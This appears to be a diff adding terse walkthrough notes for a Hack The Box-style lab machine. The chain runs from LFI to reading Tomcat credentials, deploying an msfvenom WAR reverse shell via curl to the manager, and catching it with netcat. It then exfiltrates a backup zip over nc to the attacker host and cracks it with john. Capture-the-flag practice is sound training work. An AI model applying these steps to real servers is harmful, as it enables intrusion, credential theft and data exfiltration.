@@ -1,0 +1,13 @@
+10.10.10.194
+(Check out AutoRecon)
+add megahosting.htb to /etc/hosts
+we have LFI via the news page param /usr/share/tomcat9/etc/tomcat-users.xml
+msfvenom -> CVE java file creation with LHOST, LPORT params
+nc -lvnp <port>
+curl --user <creds> --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shell.war"
+upgrade shell with python pty or elsewise
+run linpeas -> 2 backup files
+nc -lvp 1234 > out.file
+nc -w 3 10.10.14.15 1234 < /var/www/html/files/xxxxxx_backup.zip
+zip2john zip -> john
+cracked hash -> su ash
